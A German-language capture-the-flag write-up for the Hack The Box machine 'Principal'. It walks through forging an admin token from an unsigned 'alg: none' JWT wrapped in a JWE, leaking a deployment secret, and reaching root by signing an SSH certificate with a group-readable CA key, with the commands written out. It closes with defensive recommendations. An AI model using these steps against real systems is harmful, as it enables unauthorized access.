# Hack The Box: Principal Writeup

Flags sind absichtlich nicht enthalten. Sensitive Werte wie Passwörter, private Keys und Token sind redacted.

## Überblick

Principal ist eine Linux-Maschine mit einer Jetty-basierten internen Plattform auf Port 8080. Die zentrale Schwachstelle liegt in der JWT/JWE-Verarbeitung: Ein verschlüsselter Token wird akzeptiert, obwohl das innere JWT unsigniert ist. Dadurch kann ein Admin-Token erzeugt werden. Anschließend führt eine geleakte Deployment-Konfiguration zu SSH-Zugriff und eine falsch geschützte SSH-CA zu Root.

## Recon

Nmap zeigte nur zwei offene Ports:

```text
22/tcp    ssh   OpenSSH 9.6p1 Ubuntu
8080/tcp  http  Jetty - Principal Internal Platform
```

Der HTTP-Dienst leitete auf `/login` weiter. Header und HTML verrieten:

```text
Server: Jetty
X-Powered-By: pac4j-jwt/6.0.3
Title: Principal Internal Platform - Login
```

Die Login-Seite lud `/static/js/app.js`. Dort standen wichtige Hinweise zur Authentifizierung:

```text
/api/auth/login
/api/auth/jwks
/api/dashboard
/api/users
/api/settings
JWE: RSA-OAEP-256 + A128GCM
Inner JWT: RS256 laut Kommentar
```

## Foothold: Admin-Token fälschen

Der öffentliche JWKS-Endpunkt war ohne Authentifizierung erreichbar:

```text
/api/auth/jwks
```

Da JWE mit dem öffentlichen RSA-Key verschlüsselt wird, kann grundsätzlich jeder einen Token verschlüsseln. Entscheidend war, dass die Anwendung ein verschlüsseltes JWE mit einem unsignierten inneren JWT akzeptierte.

Der erfolgreiche Payload war konzeptionell:

```json
{
  "alg": "none",
  "typ": "JWT"
}
.
{
  "sub": "admin",
  "role": "ROLE_ADMIN",
  "iss": "principal-platform",
  "iat": <now>,
  "exp": <now+ttl>
}
.
```

Dieses innere JWT wurde anschließend als JWE mit `RSA-OAEP-256` und `A128GCM` verschlüsselt. Mit dem resultierenden Bearer Token waren Admin-Endpunkte erreichbar.

## Enumeration als Admin

`/api/users` zeigte mehrere Accounts, darunter einen Deployment-Serviceaccount:

```text
svc-deploy - Service account for automated deployments via SSH certificate auth
```

`/api/settings` enthielt die entscheidenden Infrastruktur-Details:

```text
sshCertAuth: enabled
sshCaPath: /opt/principal/ssh/
notes: SSH certificate auth configured for automation
```

Außerdem war dort ein Deployment-Secret hinterlegt. Dieses Secret funktionierte als SSH-Passwort für `svc-deploy`.

## User

Mit den Deployment-Credentials war SSH-Zugriff möglich:

```text
ssh svc-deploy@<target-ip>
```

Der User `svc-deploy` konnte die User-Flag lesen.

## Privilege Escalation

Die lokale Enumeration zeigte:

```text
uid=1001(svc-deploy) gid=1002(svc-deploy) groups=1002(svc-deploy),1001(deployers)
```

Unter `/opt/principal/ssh/` lag eine SSH-CA-Konfiguration. Kritisch war, dass die private CA-Datei für die Gruppe `deployers` lesbar war:

```text
/opt/principal/ssh/ca
/opt/principal/ssh/ca.pub
```

Gleichzeitig vertraute `sshd` dieser CA:

```text
TrustedUserCAKeys /opt/principal/ssh/ca.pub
PermitRootLogin prohibit-password
```

Da Root-Login per Public-Key/Zertifikat nicht verboten war, konnte ein eigener SSH-Key erzeugt und mit der CA für den Principal `root` signiert werden:

```text
ssh-keygen -t ed25519 -f root_key -N ''
ssh-keygen -s ca -I root-cert -n root -V +2h root_key.pub
ssh -i root_key -o CertificateFile=root_key-cert.pub root@<target-ip>
```

Damit war Root-Zugriff möglich.

## Kill Chain

```text
Jetty login app
  -> public JWKS + weak JWE/JWT validation
  -> forged encrypted admin token
  -> /api/settings disclosure
  -> SSH as svc-deploy
  -> readable trusted SSH CA private key
  -> sign root SSH certificate
  -> root
```

## Takeaways

- JWE-Verschlüsselung ersetzt keine Signaturprüfung. Ein verschlüsseltes, aber unsigniertes inneres JWT darf nicht vertraut werden.
- `alg: none` muss serverseitig strikt abgelehnt werden.
- Public JWKS ist normal, aber in Kombination mit schwacher Validierung kann es das Erzeugen gültig verschlüsselter Tokens ermöglichen.
- SSH-CA-private Keys dürfen niemals für Deployment-User oder Gruppen lesbar sein.
- Wenn eine User-CA von `sshd` vertraut wird, müssen Principals und Nutzungszweck sauber eingeschränkt werden.

## Empfehlungen

- JWT-Verifikation strikt erzwingen: Algorithm-Allowlist, Signaturpflicht, Issuer/Audience/Expiry validieren.
- Keine Secrets in Admin-Settings-APIs zurückgeben.
- Deployment-Secrets rotieren und nicht für interaktives SSH wiederverwenden.
- SSH-CA-Private-Key offline oder in Vault/HSM schützen.
- Für Zertifikatsauth `AuthorizedPrincipalsFile`/`AuthorizedPrincipalsCommand` verwenden und Root-Zertifikatslogin explizit verhindern.
